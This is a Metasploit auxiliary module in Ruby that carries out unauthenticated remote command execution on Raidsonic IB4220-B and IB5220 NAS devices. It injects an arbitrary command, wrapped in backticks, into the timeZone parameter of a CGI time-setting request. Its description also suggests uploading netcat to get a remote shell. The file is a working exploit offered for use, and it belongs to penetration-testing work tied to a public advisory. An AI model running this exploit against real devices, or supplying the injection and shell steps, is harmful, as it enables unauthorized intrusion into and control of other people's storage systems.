##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'Raidsonic IB4220-B / IB5220 NAS - Unauthenticated Remote Command Execution',
			'Description'     => %q{
					Some NAS devices from Raidsonic are vulnerable to OS Command injection and authentication bypass.
				This OS module is also using the authentication bypass to get direct access to the
				vulnerable path.

					Tested Firmware IB5220: 2.6.3-20100206S
					Tested Firmware IB4220: 2.6.3.IB.1.RS.1

				Note: This is a blind os command injection vulnerability. This means that you will
				not see any output of your command. Try a ping command to your local system for a
				first test.

				Hint: To get a remote shell you could upload a netcat binary and exec it.
			},
			'Author'          => [ 'm-1-k-3' ],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
						[ 'URL', 'http://www.raidsonic.de/de/products/details.php?we_objectID=6848' ],
						[ 'URL', 'http://www.raidsonic.de/data/Downloads/Firmware/IB-NAS5220_standard.zip' ],
						[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-010' ],
						[ 'EDB', '24499' ],
						[ 'OSVDB', '90221' ],
						[ 'BID', '57958' ]
				],
			'DisclosureDate' => 'Feb 12 2013'))

		register_options(
			[
				OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1']),
			], self.class)
	end

	def run
		#setting up the needed variables
		uri = '/cgi/time/timeHandler.cgi'
		cmd = Rex::Text.uri_encode(datastore['CMD'])

		print_status("#{rhost}:#{rport} - Sending remote command: " + cmd)

		#orignial request
		#data_cmd = "month=#{rand(12)}&date=#{rand(30)}&year=20#{rand(99)}&hour=#{rand(12)}
		#&minute=#{rand(60)}&ampm=PM&timeZone=Amsterdam`#{cmd}`&ntp_type=default&ntpServer=none
		#&old_date=+1+12007&old_time=1210&old_timeZone=Amsterdam&renew=0"

		begin
			res = send_request_cgi(
				{
					'uri'    => uri,
					'method' => 'POST',
					#not working without setting encode_params to false!
					'encode_params' => false,
					'vars_post' => {
						"month" => "#{rand(12)}",
						"date" => "#{rand(30)}",
						"year" => "20#{rand(99)}",
						"hour" => "#{rand(12)}",
						"minute" => "#{rand(60)}",
						"ampm" => "PM",
						"timeZone" => "Amsterdam`#{cmd}`",
						"ntp_type" => "default",
						"ntpServer" => "none",
						"old_date" => " 1 12007",
						"old_time" => "1210",
						"old_timeZone" => "Amsterdam",
						"renew" => "0"
					}
				})
		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - #{uri} - Failed to connect to the web server")
			return
		end
		print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\n")
	end
end
